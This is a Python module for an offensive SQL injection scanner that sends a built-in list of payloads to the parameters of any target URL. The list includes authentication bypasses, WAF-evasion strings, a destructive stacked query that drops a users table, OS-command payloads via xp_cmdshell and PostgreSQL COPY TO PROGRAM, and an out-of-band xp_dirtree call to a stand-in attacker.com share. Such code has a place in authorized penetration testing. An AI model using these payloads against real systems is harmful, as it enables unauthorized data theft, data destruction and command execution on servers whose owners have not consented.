"""
SQL Injection Scanner
Detects SQL injection vulnerabilities using multiple techniques
"""

import logging
import re
import time
from datetime import datetime
from urllib.parse import parse_qs, urlparse

from ..config import Config
from .base import BaseScanner

logger = logging.getLogger(__name__)


class SQLiScanner(BaseScanner):
    """SQL Injection vulnerability scanner"""

    def __init__(
        self, target, payload_file=None, output_file=None, dynamic_payloads=None
    ):
        super().__init__(target, output_file)
        self.payload_file = payload_file
        self.dynamic_payloads = dynamic_payloads
        self.sql_error_patterns = [
            r"sql syntax.*mysql",
            r"warning.*mysql_.*",
            r"postgresql.*error",
            r"oracle.*error",
            r"microsoft.*database.*error",
            r"warning.*sqlstate",
            r"odbc.*driver.*error",
            r"jdbc.*sqlexception",
            r"sqlite\.exception",
            r"mariadb.*error",
        ]

    def get_payloads(self):
        """Load SQL injection payloads"""
        # Modern 2025 SQLi payloads - updated for latest WAF bypasses
        default_payloads = [
            # Classic boolean-based
            "' OR '1'='1",
            "' OR 1=1#",
            "' OR 1=1--",
            "' OR 1=1-- -",
            "' OR 1=1/*",
            "admin' OR '1'='1'-- -",
            "admin'/**/OR/**/1=1#",
            # Time-based blind SQLi (2025 techniques)
            "' OR SLEEP(5)--",
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' OR pg_sleep(5)--",
            "' OR BENCHMARK(5000000,MD5(1))--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            # Union-based SQLi with NULL padding
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            # Advanced WAF bypass techniques (2025)
            "' /*!50000OR*/ 1=1-- -",
            "' /*!12345UNION*/ /*!12345SELECT*/ NULL--",
            "' OR 1=1%00",
            "' OR 1=1%0A",
            "' OR/**/1=1--",
            "' OR%0D%0A1=1--",
            "' UNION/**/SELECT/**/NULL--",
            # JSON-based SQLi (modern APIs)
            "' OR '1'='1' -- -",
            "{\"id\": \"1' OR '1'='1\"}",
            '{"username": "admin\'--"}',
            # NoSQL injection (MongoDB, etc.)
            "' || '1'=='1",
            "' || 1==1//",
            '{"$gt": ""}',
            '{"$ne": null}',
            "admin' && this.password.match(/.*/)//+%00",
            # XML-based SQLi
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--",
            # Boolean-based advanced
            "' AND 1=1--",
            "' AND 1=2--",
            "' OR 'x'='x",
            "' AND 'a'='a",
            "' AND 'a'='b",
            # Information extraction
            "'; SELECT @@version--",
            "'; SELECT system_user()--",
            "'; SELECT current_database()--",
            "' AND extractvalue(1,concat(0x7e,version()))--",
            "' AND updatexml(1,concat(0x7e,database()),1)--",
            # Stacked queries
            "'; DROP TABLE users--",
            "'; EXEC xp_cmdshell('whoami')--",
            # PostgreSQL specific (2025)
            "' OR 1=1; COPY (SELECT '') TO PROGRAM 'sleep 5'--",
            "'; SELECT pg_sleep(5)--",
            # MSSQL specific (2025)
            "' UNION SELECT NULL,NULL,NULL FROM information_schema.tables--",
            "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'--",
            # MySQL specific (2025)
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            # Second-order SQLi
            "admin'||'",
            "' OR '1'='1'||'",
        ]

        if self.dynamic_payloads:
            return self.dynamic_payloads

        if self.payload_file:
            try:
                with open(self.payload_file, "r") as f:
                    custom_payloads = [
                        line.strip()
                        for line in f
                        if line.strip() and not line.startswith("#")
                    ]
                    default_payloads.extend(custom_payloads)
                    logger.info(f"Loaded {len(custom_payloads)} custom payloads")
                    print(
                        f"{Config.COLOR_GREEN}[+] Loaded {len(custom_payloads)} custom payloads{Config.COLOR_RESET}"
                    )
            except Exception as e:
                logger.error(f"Error loading payload file: {e}")
                print(
                    f"{Config.COLOR_ORANGE}[-] Error loading payload file: {str(e)}{Config.COLOR_RESET}"
                )

        return default_payloads

    def extract_parameters(self, url):
        """Extract parameters from URL"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return {k: v[0] for k, v in params.items()}

    def analyze_response(self, response, original_response=None):
        """Analyze response for SQL injection indicators"""
        indicators = {
            "error_based": any(
                re.search(pattern, response.text.lower())
                for pattern in self.sql_error_patterns
            ),
            "time_based": response.elapsed.total_seconds() > 5,
            "size_based": original_response
            and abs(len(response.content) - len(original_response.content)) > 100,
            "status_code": response.status_code != 200,
        }
        return any(indicators.values()), indicators

    def scan(self):
        """Execute SQL injection scan"""
        print(
            f"\n{Config.COLOR_BLUE}[*] Starting Greaper SQLi scan on {self.target}{Config.COLOR_RESET}"
        )

        payloads = self.get_payloads()

        # Get baseline response
        try:
            baseline_response = self.make_request(self.target)
            print(
                f"{Config.COLOR_BLUE}[*] Established baseline response{Config.COLOR_RESET}"
            )
        except:
            print(
                f"{Config.COLOR_RED}[-] Could not establish baseline response{Config.COLOR_RESET}"
            )
            return

        # Extract parameters
        params = self.extract_parameters(self.target)
        if not params and "FUZZ" not in self.target:
            print(
                f"{Config.COLOR_RED}[-] No parameters found to test. Please include 'FUZZ' in URL or add parameters.{Config.COLOR_RESET}"
            )
            return

        found_vulnerabilities = []

        for payload in payloads:
            if params:
                for param_name, param_value in params.items():
                    test_url = self.target.replace(
                        f"{param_name}={param_value}", f"{param_name}={payload}"
                    )
                    try:
                        response = self.make_request(test_url)
                        is_vulnerable, indicators = self.analyze_response(
                            response, baseline_response
                        )

                        if is_vulnerable:
                            result = f"[+] Potential SQLi found on {test_url} With payload: {payload}"
                            print(f"{Config.COLOR_GREEN}{result}{Config.COLOR_RESET}")
                            found_vulnerabilities.append(result)
                        else:
                            print(
                                f"{Config.COLOR_RED}[-] No SQLi found for payload: {payload}{Config.COLOR_RESET}"
                            )
                    except Exception as e:
                        logger.error(f"Error testing payload: {e}")
                        print(
                            f"{Config.COLOR_RED}[-] Error testing payload: {str(e)}{Config.COLOR_RESET}"
                        )
            else:
                test_url = self.target.replace("FUZZ", payload)
                try:
                    response = self.make_request(test_url)
                    is_vulnerable, indicators = self.analyze_response(
                        response, baseline_response
                    )

                    if is_vulnerable:
                        result = f"[+] Potential SQLi found on {test_url} With payload: {payload}"
                        print(f"{Config.COLOR_GREEN}{result}{Config.COLOR_RESET}")
                        found_vulnerabilities.append(result)
                    else:
                        print(
                            f"{Config.COLOR_RED}[-] No SQLi found for payload: {payload}{Config.COLOR_RESET}"
                        )

                    time.sleep(0.5)
                except Exception as e:
                    logger.error(f"Error testing payload: {e}")
                    print(
                        f"{Config.COLOR_RED}[-] Error testing payload: {str(e)}{Config.COLOR_RESET}"
                    )

        self.results = found_vulnerabilities

        print("\n" + "=" * 50)
        if found_vulnerabilities:
            self.save_results()
        else:
            print(
                f"\n{Config.COLOR_RED}[-] No SQLi vulnerabilities found.{Config.COLOR_RESET}"
            )
            print(
                f"\n{Config.COLOR_RED}[-] No SQLi vulnerabilities found.{Config.COLOR_RESET}"
            )
